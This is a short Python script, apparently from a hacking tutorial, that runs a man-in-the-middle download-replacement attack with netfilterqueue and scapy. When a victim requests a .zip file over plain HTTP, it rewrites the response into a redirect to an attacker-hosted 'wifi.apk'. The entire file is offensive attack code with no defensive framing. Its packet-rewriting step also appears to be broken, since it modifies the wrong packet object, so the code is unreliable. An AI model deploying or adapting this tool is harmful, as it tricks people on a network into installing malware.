#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ackList = []

# A field in scapy will always be a list

def setLoad(packet, LOAD):
    packet[scapy.Raw].load = LOAD
    del packet[scapy.IP].chksum
    del packet[scapy.IP].len
    del packet[scapy.TCP].chksum
    return packet

def processPacket(packet):
    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.Raw):
        if scapyPacket.haslayer(scapy.TCP):
            if scapyPacket[scapy.TCP].dport == 80:  # 80 is http port, dport is a request
                if "GET" in scapyPacket[scapy.Raw].load:
                    if ".zip" in scapyPacket[scapy.Raw].load:
                        ackList.append(scapyPacket[scapy.TCP].ack)


            elif scapyPacket[scapy.TCP].sport == 80:
                if scapyPacket[scapy.TCP].seq in ackList:
                    ackList.remove(scapyPacket[scapy.TCP].seq)
                    setLoad(packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.1.5/wifi.apk")
                    packet.set_payload(str(scapyPacket))


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processPacket) # We bind our linux queue to this queue and set it so that every time a packet is recieved
# in that queue, we will execute the function processPacket, like a loop.
queue.run() # With this command we run the queue so it begins.